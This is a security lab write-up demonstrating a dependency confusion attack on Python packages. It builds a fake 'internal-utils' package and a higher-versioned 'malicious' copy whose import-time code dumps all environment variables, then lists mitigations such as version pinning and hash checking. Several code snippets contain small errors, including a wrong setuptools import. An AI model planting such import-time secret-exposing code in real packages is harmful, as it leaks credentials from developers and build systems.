## Vulnerability Description
Software Supply Chain Failure occurs when applications trust external dependencies without verifying their source, integrity, or version.
In this lab, we simulate a **dependency confusion attack**, where a malicious package with a higher version number replaces a trusted internal package. When the application imports the package, arbitrary code is executed.
This demonstrates how improper dependency management can lead to full compromise of an application or CI/CD environment.

## Attack concept
Python's package manager `pip` installs the highest available version of the package, unless a specific version is pinned.

If an internal package exists for example `internal-utils==1.0.0`. An attacker publishes the same package with a higher version for example `internal-utils=9.9.9`

Then pip may install the malicious version instead of ours

This results in:
- Arbitrary code execution
- Environment variable exposure
- Possible credential leakage
### Writeup
1. We need to create a simple python package
- `mkdir internal_utils` 
- Inside this directory create a `__init__.py` - this is a thing that runs when you're importing the package
```python
def hello():
	print('secure packge')
```
- Now make a `setup.py` which will import the package also in the same directory  
```python
from setuptools import setup, internal_packages
setup(
  name='internal-utils',
  version='1.0.0',
  packages=find_packages(),
)
```
2. Now just install it
- `pip install .`
- Your system now has `internal_utils 1.0.0`
2. Now we can create a malicious version
- Modify the version in `setup.py` `version='1.0.0 -> version='9.9.9'` Its necessary to change so our version will be higher then the safe version which will result in our version being chosen.
- Now change the `__init__.py`
```python
import os

print('Malicous version')
print('ENV: ', dict(os.environ))

def hello():
	print('got hacked')
```
4. Install it again (this time its the malicious version)
- `pip install .`
5. Now we can use it
- `mkdir app & cd app` create and enter the app directory and then create a simple python file in there `vi main.py`
- `pip install "path to your pacakge (u need to sepcify since its local)"`


## Impact
- Arbitrary code execution
- Exposure of secrets stored in environment variables
- Potential lateral movement within internal networks
In real world attacks this could result in credential theft, data exfiltration, or RCE on build servers

## Root cause
- Unpinned dependency versions
- Allowing public registry fallback
- Lack of package integrity verification
- Blind trust in dependency resolution

## Mitigation
- In `requirements.txt` 
```text
internal-utils==1.0.0
```
- Use private package registers
- Disable public fallback for internal package names
- Use --require-hashes for integrity verification


